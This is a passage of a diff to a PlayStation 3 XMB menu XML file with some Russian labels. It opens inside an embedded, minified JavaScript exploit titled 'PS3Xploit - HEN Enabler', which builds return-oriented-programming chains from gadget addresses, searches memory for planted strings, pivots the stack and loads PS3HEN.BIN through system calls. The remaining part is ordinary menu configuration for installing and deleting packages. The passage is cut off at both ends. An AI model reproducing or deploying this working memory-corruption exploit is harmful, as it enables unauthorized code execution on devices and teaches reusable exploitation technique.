dat=document.getElementById("exploit").style.src.substr(6,size),i=0,t,k,match,exploit_addr;while(i\74dat.length*2){if(dat.charCodeAt(i/2)===exploit_data.charCodeAt(0)){match=0;for(k=0;k\74exploit_data.length*2;k+=0x2){if(dat.charCodeAt((i+k)/2)!==exploit_data.charCodeAt(k/2)){break}match+=1}if(match===exploit_data.length){exploit_addr=base+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===exploit_addr){return-1}}offset_array.push(exploit_addr);return exploit_addr}}i+=0x10}return 0}function memcpy(dest,src,len){return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70)}function stack_frame_hookup(){return(unescape("\u4141\u2A2F")+hw(gadget1_addr)+hw(toc_addr)+fill16(0x20,dbyte41)+hdw(toc_addr)+fill16(0x70,dbyte41))}function scall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out){if(r31out===null){r31out=gtemp_addr}return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod1_addr)+fill16(0x50,dbyte41)+fill4(0xc,dbyte41)+hw(sc)+hw(r10)+hw(r8)+hw(r7)+hw(r6)+hw(r5)+hw(r4)+fill4(0x4,dbyte41)+hw(r9)+fill16(0x20,dbyte41)+hdw(r3)+fill16(0x10,dbyte41)+hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod4a_addr)+fill16(0x60,dbyte41)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out){var min_stack_size=0x20;if(r31out===null){r31out=gtemp_addr}if(r31in===null){r31in=gtemp_addr}return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod1_addr)+fill16(0x50,dbyte41)+fill4(0xc,dbyte41)+hw(r11)+hw(r10)+hw(r8)+hw(r7)+hw(r6)+hw(r5)+hw(r4)+fill4(0x4,dbyte41)+hw(r9)+fill16(0x20,dbyte41)+hdw(r3)+fill16(0x10,dbyte41)+hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(r31in)+fill16(0x10,dbyte41)+hdw(sub)+fill16(sub_frame_size-min_stack_size,dbyte00)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function fillNbytes(nbytes,hex_val,N){var stemp="",iterator=0,tmp=h2b(hex_val);while(iterator\74nbytes/N){stemp+=tmp.repeat(N/2);iterator++}return stemp}function fill4(nbytes,hex_val){return fillNbytes(nbytes,hex_val,4)}function fill8(nbytes,hex_val){return fillNbytes(nbytes,hex_val,8)}function fill16(nbytes,hex_val){return fillNbytes(nbytes,hex_val,16)}function strncmp(str1,str2,n){str1=str1.substring(0,n);str2=str2.substring(0,n);return str1==str2?0:str1\76str2?1:-1}function rop_exit_hen(fail){var chk="53434500";var chk2=cmem(0x8a000000,0x10,3);chk2=chk2.toAscii(true);if(strncmp(chk,chk2,4)!=0){show(\47\74div id="c" class="fail"\76\74/div\76\74b\76Failed! Rebooting!\74/b\76\47);initROP2(true)}else{window.close()}}function initROP2(init){try{if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;total_loops=0}if(t_out!==0){clearTimeout(t_out);t_out=0}offset_array=[];stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;stack_frame=stack_frame_hookup()+stack_frame_swap(0x8a060000);while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if(frame_fails%10===0){search_base_off+=0;search_size_ext+=0}lc2();return}stack_frame=stack_frame.replaceAt(0,h2b(0x2a2f));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;lc2();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill16(0x30,0x8282)+hw(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){lc2();return}jump_2=jump_2.replaceAt(0,h2b(0x7efb));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hw(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){lc2();return}jump_1=jump_1.replaceAt(0,h2b(0x7efa));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}var sf=cmem(stack_frame_addr-0x4,0x8000,stack_frame.length);var j2=cmem(jump_2_addr-0x4,0x1000,jump_2.length);var j1=cmem(jump_1_addr-0x4,0x1000,jump_1.length);if(j2===jump_2\46\46j1===jump_1\46\46sf===stack_frame){if(t_out!==0){clearTimeout(t_out)}setTimeout(trigger,1000,jump_1_addr)}else{lc2()}}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function initROP(init){try{if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;var usb_sp="/dev_flash/hen/PS3HEN.BIN";xtra_data=start_x.convert()+usb_sp.convert()+index_key.convert(true)+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\74search_size){lc1();return}xtra_data=xtra_data.replaceAt(0,h2b(0x7efd));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}var usb_fp_addr=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=usb_fp_addr+usb_sp.convertedSize();stack_frame=stack_frame_hookup()+scall(0x321,usb_fp_addr,0,0x8e000000,0,0,0,0,0)+scall_r3r5_p2p(0x322,0x8e000000,0x8a000000,0x300000,0x8e000008,0,0,0,0,0,0)+stack_frame_swap(0x8a000000);while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if(frame_fails%10===0){search_base_off+=0;search_size_ext+=0}lc1();return}stack_frame=stack_frame.replaceAt(0,h2b(0x2a2f));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;lc1();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill16(0x30,0x8282)+hw(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){lc1();return}jump_2=jump_2.replaceAt(0,h2b(0x7efb));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hw(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){lc1();return}jump_1=jump_1.replaceAt(0,h2b(0x7efa));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}var sf=cmem(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=cmem(xtra_data_addr-0x4,0x1000,xtra_data.length);var j2=cmem(jump_2_addr-0x4,0x1000,jump_2.length);var j1=cmem(jump_1_addr-0x4,0x1000,jump_1.length);if(j2===jump_2\46\46j1===jump_1\46\46x===xtra_data\46\46sf===stack_frame){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{lc1()}}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function stack_frame_swap(new_stack_addr){return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+hdw(new_stack_addr)+fill8(0x8,dbyte41)+hdw(gmod9_addr))}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit_hen,4500,"\74b\76HEN Failed!\74/b\76");t_out=0;total_loops=0}document.write(\47\74html\76\74head\76\74title\76PS3Xploit - HEN Enabler\74/title\76\74style\76html{color:#fff;left:100%;overflow:hidden;position:relative}*{font-weight:100;font-size:32px !important}#a{display:table;height:100%;left:-100%;position:relative;width:100%;text-align:center}#b{display:table-cell;text-align:center;vertical-align:middle;width:100%}#c{-webkit-animation:s 2s infinite;-webkit-border-radius:10px;background:#6f0;display:inline-block;height:48px;right:24px;position:absolute;top:28px;width:48px}#c.fail{background:#f00}#d{position:relative;z-index:1}#result{-webkit-border-radius:10px;background:#000;display:inline-block;font-weight:700;padding:32px;padding-right:92px;position:relative}@-webkit-keyframes s{0%{-webkit-transform:rotate(0)}100%,90%{-webkit-transform:rotate(540deg)}}input{opacity:0}b{color:#f00}s{color:#6f0;text-decoration:none;font-weight:800}\74/style\76\74/head\76\74body\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76\74div id="a"\76 \74input type="radio" autofocus/\76\74div id="b"\76\74div id="result"\76\74div id="c"\76\74/div\76\74div id="d"\76Enabling \74s\76HEN\74/s\76\74/div\76\74/div\76\74/div\76\74/div\76\74/body\76\74/html\76\47);setTimeout(function(){initROP(true)},0);');</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item  class="type:x-xmb/module-action"   key="hen_enable"       attr="hen_enable" />
+		</Items>
+	</View>
+
+	<View id="seg_package_files">
+		<Attributes>
+			<Table key="package_files">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemAlbum</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_package_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_package_file_info</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query  class="type:x-xmb/folder-pixmap"  key="package_files" attr="package_files" src="#seg_package_fixed"/>
+		</Items></View>
+	
+	<View id="seg_package_fixed">
+		<Attributes>
+			<Table key="host_psn">
+				<Pair key="icon_rsc"><String>item_tex_online_storage</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_psn_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_psn_file_info</String></Pair>
+				<Pair key="str_noitem"><String>msg_tool_no_psn_content</String></Pair>
+				<Pair key="child"><String>segment</String></Pair>
+			</Table>
+			<Table key="package_files_install">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_install_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_install_file_info</String></Pair>
+			</Table>
+			<Table key="seg_package_files_delete">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_delete_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_delete_file_info</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="host_psn" attr="host_psn" src="#seg_install_files_psn_path"/>
+			<Query class="type:x-xmb/folder-pixmap" key="package_files_install" attr="package_files_install" src="#seg_install_package"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_package_files_delete" attr="seg_package_files_delete" src="#seg_delete_package"/>
+		</Items></View>
+
+	<View id="seg_install_files_psn_path">
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_hdd_install" src="ese://localhost/query?type=install_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_pkg_install" src="ese://localhost/query?type=install_pkg"/>
+		</Items></View>
+	
+	<View id="seg_install_package">
+		<Attributes>
+			<Table key="host_device">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemAlbum</String></Pair>
+				<Pair key="title"><String>Все *.PKG</String></Pair>
+				<Pair key="info"><String>Установить из всех доступных источников</String></Pair>
+				<Pair key="str_noitem"><String>msg_error_no_content</String></Pair>
+				<Pair key="child"><String>segment</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>
+			<Table key="host_device_1">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_hdd0_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_hdd0_install_info</String></Pair>
+				<Pair key="str_noitem"><String>msg_tool_no_package</String></Pair>
+				<Pair key="child"><String>segment</String></Pair>
+			</Table>
+			<Table key="host_device_2">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_usb_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_usb_install_info</String></Pair>
+				<Pair key="str_noitem"><String>msg_tool_no_package</String></Pair>
+				<Pair key="child"><String>segment</String></Pair>
+			</Table>
+			<Table key="pkg_linker">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="title"><String>Локальный Вебсервер</String></Pair>
+				<Pair key="info"><String>Установить с локального Вебсервера</String></Pair>
+				<Pair key="str_noitem"><String>msg_tool_no_package</String></Pair>
+			</Table>
+			<Table key="host_device_3">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_og_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_og_install_info</String></Pair>
+				<Pair key="str_noitem"><String>msg_tool_no_package</String></Pair>
+				<Pair key="child"><String>segment</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device" attr="host_device" src="#seg_install_files_alldev_path"/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device_1" attr="host_device_1" src="#seg_install_files_hdd0_path"/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device_2" attr="host_device_2" src="#seg_install_usb_path"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_device_3" attr="host_device_3" src="#seg_install_files_og_path"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_linker"  attr="pkg_linker" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/package_link.xml#pkg_items"/>
+		</Items>
+	</View>
+	
+	<View id="seg_install_files_alldev_path">
+		<Items>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_flash" src="host://localhost/q?path=/dev_flash/rebug/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_home_pkg1" src="host://localhost/q?path=/app_home/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_home_pkg2" src="host://localhost/q?path=/app_home/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_hdd0_pkg1" src="host://localhost/q?path=/dev_hdd0/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_hdd0_pkg2" src="host://localhost/q?path=/dev_hdd0/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_hdd0_dl" src="host://localhost/q?path=/dev_hdd0/downloads&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0_pkg1" src="host://localhost/q?path=/dev_usb000/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0_pkg2" src="host://localhost/q?path=/dev_usb000/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0_dl" src="host://localhost/q?path=/dev_usb000/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1_pkg1" src="host://localhost/q?path=/dev_usb001/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1_pkg2" src="host://localhost/q?path=/dev_usb001/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1_dl" src="host://localhost/q?path=/dev_usb001/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2" src="host://localhost/q?path=/dev_usb002&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2_pkg1" src="host://localhost/q?path=/dev_usb002/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2_pkg2" src="host://localhost/q?path=/dev_usb002/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2_dl" src="host://localhost/q?path=/dev_usb002/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3" src="host://localhost/q?path=/dev_usb003&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3_pkg1" src="host://localhost/q?path=/dev_usb003/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3_pkg2" src="host://localhost/q?path=/dev_usb003/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3_dl" src="host://localhost/q?path=/dev_usb003/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4" src="host://localhost/q?path=/dev_usb004&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4_pkg1" src="host://localhost/q?path=/dev_usb004/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4_pkg2" src="host://localhost/q?path=/dev_usb004/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4_dl" src="host://localhost/q?path=/dev_usb004/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5" src="host://localhost/q?path=/dev_usb005&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5_pkg1" src="host://localhost/q?path=/dev_usb005/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5_pkg2" src="host://localhost/q?path=/dev_usb005/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5_dl" src="host://localhost/q?path=/dev_usb005/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6" src="host://localhost/q?path=/dev_usb006&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6_pkg1" src="host://localhost/q?path=/dev_usb006/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6_pkg2" src="host://localhost/q?path=/dev_usb006/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6_dl" src="host://localhost/q?path=/dev_usb006/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7" src="host://localhost/q?path=/dev_usb007&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7_pkg1" src="host://localhost/q?path=/dev_usb007/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7_pkg2" src="host://localhost/q?path=/dev_usb007/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7_dl" src="host://localhost/q?path=/dev_usb007/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms" 	src="host://localhost/q?path=/dev_ms&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms_pkg1" 	src="host://localhost/q?path=/dev_ms/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms_pkg2" src="host://localhost/q?path=/dev_ms/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms_dl" src="host://localhost/q?path=/dev_ms/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_sd" 	src="host://localhost/q?path=/dev_sd&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_sd_pkg1" 	src="host://localhost/q?path=/dev_sd/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_sd_pkg2" src="host://localhost/q?path=/dev_sd/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_sd_dl" src="host://localhost/q?path=/dev_sd/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_cf" 	src="host://localhost/q?path=/dev_cf&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_cf_pkg1" 	src="host://localhost/q?path=/dev_cf/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_cf_pkg2" src="host://localhost/q?path=/dev_cf/PKG&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_cf_dl" src="host://localhost/q?path=/dev_cf/PS3/DOWNLOADS&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_hdd0" src="host://localhost/q?path=/dev_hdd0/tmp/np_pkg&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/folder-pixmap" key="seg_hdd_install" src="ese://localhost/query?type=install_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_pkg_install" src="ese://localhost/query?type=install_pkg"/>
+		</Items>
+	</View>
+
+	<View id="seg_install_files_hdd0_path">
+		<Items>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_hdd0" src="host://localhost/q?path=/dev_hdd0/packages&suffix=.pkg&subclass=x-host/package"/>		  
+		</Items></View>
+
+	<View id="seg_install_usb_path">
+		<Items>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_host" src="host://localhost/q?path=/app_home/packages/&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd/packages&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000/packages&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001/packages&suffix=.pkg&subclass=x-host/package" />
+		</Items></View>
+
+	<View id="seg_install_files_og_path">
+		<Items>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_host" src="host://localhost/q?path=/app_home/&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001&suffix=.pkg&subclass=x-host/package" />
+		</Items></View>
+	
+	<View id="seg_delete_package">
+		<Attributes>
+			<Table key="host_device">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemAlbum</String></Pair>
+				<Pair key="title"><String>Все *.PKG</String></Pair>
+				<Pair key="info"><String>Удалить из всех доступных источников</String></Pair>
+				<Pair key="str_noitem"><String>msg_error_no_content</String></Pair>
+				<Pair key="child"><String>segment</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>
+			<Table key="host_device_1">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_hdd0_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_hdd0_delete_info</String></Pair>
+				<Pair key="str_noitem"><String>msg_tool_no_package</String></Pair>				
+				<Pair key="child"><String>segment</String></Pair>
+			</Table>
+			<Table key="host_device_2">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_usb_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_usb_delete_info</String></Pair>
+				<Pair key="str_noitem"><String>msg_tool_no_package</String></Pair>
+				<Pair key="child"><String>segment</String></Pair>
+			</Table>
+			<Table key="host_device_3">
+				<Pair key="icon_rsc"><String>tex_album_icon</String></Pair>
+				<Pair key="title_rsc"><String>msg_tool_og_file</String></Pair>
+				<Pair key="info_rsc"><String>msg_tool_og_delete_info</String></Pair>
+				<Pair key="str_noitem"><String>msg_tool_no_package</String></Pair>				
+				<Pair key="child"><String>segment</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device" attr="host_device" src="#seg_del_files_alldev_path"/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device_1" attr="host_device_1" src="#seg_delete_files_hdd0_path"/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device_2" attr="host_device_2" src="#seg_delete_usb_path"/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device_3" attr="host_device_3" src="#seg_delete_files_og_path"/>
+		</Items></View>
+		
+	<View id="seg_del_files_alldev_path">
+		<Items>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_flash" src="host://localhost/q?path=/dev_flash/rebug/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd&suffix=.pkg" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_home_pkg1" src="host://localhost/q?path=/app_home/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_home_pkg2" src="host://localhost/q?path=/app_home/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_hdd0_pkg1" src="host://localhost/q?path=/dev_hdd0/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_hdd0_pkg2" src="host://localhost/q?path=/dev_hdd0/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_hdd0_dl" src="host://localhost/q?path=/dev_hdd0/downloads&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0_pkg1" src="host://localhost/q?path=/dev_usb000/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0_pkg2" src="host://localhost/q?path=/dev_usb000/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0_dl" src="host://localhost/q?path=/dev_usb000/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1_pkg1" src="host://localhost/q?path=/dev_usb001/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1_pkg2" src="host://localhost/q?path=/dev_usb001/PKG&suffix=.pkg"/>
